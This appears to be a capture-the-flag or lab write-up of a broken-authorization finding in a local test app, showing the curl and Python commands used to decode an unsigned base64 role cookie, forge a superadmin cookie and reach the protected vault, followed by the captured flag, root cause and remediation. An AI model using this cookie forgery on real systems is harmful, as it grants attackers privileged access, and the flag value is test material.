# Finding 4: Broken Authorization — Forged Role in Client-Trusted Cookie

**Flag:** `FLAG{authz_185045471edb}`

## Steps

1. Logged in as the public test account and inspected the `auth` cookie the
   app set:
   ```
   curl -c cookies.txt -X POST http://127.0.0.1:5050/login -d "username=alice&password=password123" -i
   # Set-Cookie: auth=YWxpY2U6dXNlcg==; Path=/
   ```
   Decoded: `base64decode("YWxpY2U6dXNlcg==")` = `alice:user`.

2. Requested `/vault` as alice — denied, and the app's own error message
   confirmed the role comes straight from the cookie:
   ```
   curl -b cookies.txt http://127.0.0.1:5050/vault
   # 403 — superadmins only. You are signed in as alice (role: user).
   # The app decides your role from the auth cookie it handed you.
   ```
   The cookie is plain base64 of `username:role` with **no signature/HMAC**,
   so any value an attacker constructs is trusted as-is.

3. Forged a new cookie claiming role `superadmin` for an arbitrary username,
   with no login/password required at all:
   ```
   python3 -c "import base64; print(base64.b64encode(b'attacker:superadmin').decode())"
   # YXR0YWNrZXI6c3VwZXJhZG1pbg==
   curl --cookie "auth=YXR0YWNrZXI6c3VwZXJhZG1pbg==" http://127.0.0.1:5050/vault
   ```

4. Response granted access:
   ```
   Access granted, superadmin.
   FLAG{authz_185045471edb}
   ```

## Root cause
Authorization state (the user's role) is stored unsigned and client-side in a
plain base64 cookie. The server trusts whatever role string the client sends
instead of looking it up server-side (session store / signed token / DB) on
every request.

## Remediation
- Never trust client-supplied values for authorization decisions. Store role/
  session state server-side (e.g. Flask `session` with `SECRET_KEY`, or a
  server-side session store) and look it up by session ID.
- If a stateless token is required, sign it (e.g. JWT with HMAC/RSA, or
  Flask's signed session cookies) so tampering is detectable, and verify the
  signature on every request.
- Apply least-privilege / deny-by-default checks on sensitive routes like
  `/vault`, and log repeated authorization failures.
